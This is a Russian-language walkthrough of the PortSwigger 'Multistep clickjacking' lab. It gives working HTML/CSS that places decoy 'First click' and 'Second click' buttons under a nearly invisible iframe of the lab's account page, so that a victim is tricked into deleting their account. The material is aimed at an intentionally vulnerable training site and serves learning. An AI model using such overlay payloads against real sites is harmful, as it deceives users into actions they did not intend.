Логинимся под `wiener:peter`

При нажатии на `Delete account` нас перебрасывает на другую страницу для подтверждения действия
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/16.%20Clickjacking/5.%20Multistep%20clickjacking/pics%20for%20walkthrough/1.png)

Пока отменим, и перейдем в `Exploit server`
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/16.%20Clickjacking/5.%20Multistep%20clickjacking/pics%20for%20walkthrough/2.png)

и сконфигурируем `iframe` для первого экрана
```
<style>
	iframe {
		position:relative;
		width:1000px;
		height: 1000px;
		opacity: 0.1;
		z-index: 2;
	}
   .firstClick{
		position:absolute;
		top:520px;
		left:60px;
		z-index: 1;
	}
 
</style>
<div class="firstClick">First click</div>
<iframe src="https://0a1a00b503bdb1ce80d5537e00420083.web-security-academy.net/my-account"></iframe>
```

![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/16.%20Clickjacking/5.%20Multistep%20clickjacking/pics%20for%20walkthrough/3.png)

Перейдем во `View exploit` и убедимся, что у нас все получилось

Да, отлично, все хорошо
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/16.%20Clickjacking/5.%20Multistep%20clickjacking/pics%20for%20walkthrough/4.png)

Отлично, время дополнить его вторым кликом
```
<style>
	iframe {
		position:relative;
		width:1000px;
		height: 1000px;
		opacity: 0.1;
		z-index: 2;
	}
   .firstClick, .secondClick{
		position:absolute;
		top:520px;
		left:60px;
		z-index: 1;
	}
   .secondClick {
		top:315px;
		left:225px;
	}
 
</style>
<div class="firstClick">First click</div>
<div class="secondClick">Second click</div>
<iframe src="https://0a1a00b503bdb1ce80d5537e00420083.web-security-academy.net/my-account"></iframe>
```

![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/16.%20Clickjacking/5.%20Multistep%20clickjacking/pics%20for%20walkthrough/5.png)
Перейдем во `View exploit` и убедимся, что у нас все получилось

Да, отлично, все хорошо
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/16.%20Clickjacking/5.%20Multistep%20clickjacking/pics%20for%20walkthrough/6.png)

![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/16.%20Clickjacking/5.%20Multistep%20clickjacking/pics%20for%20walkthrough/7.png)

Я не разобрался, как сделать их исчезающими на каждом этапе, но вроде бы и так съело

Изменим `capacity` на `0.0000001` и нажмем `Store` -> `Deliver exploit to victim` и получим уведолмение об успешно выполненной лабораторной работе
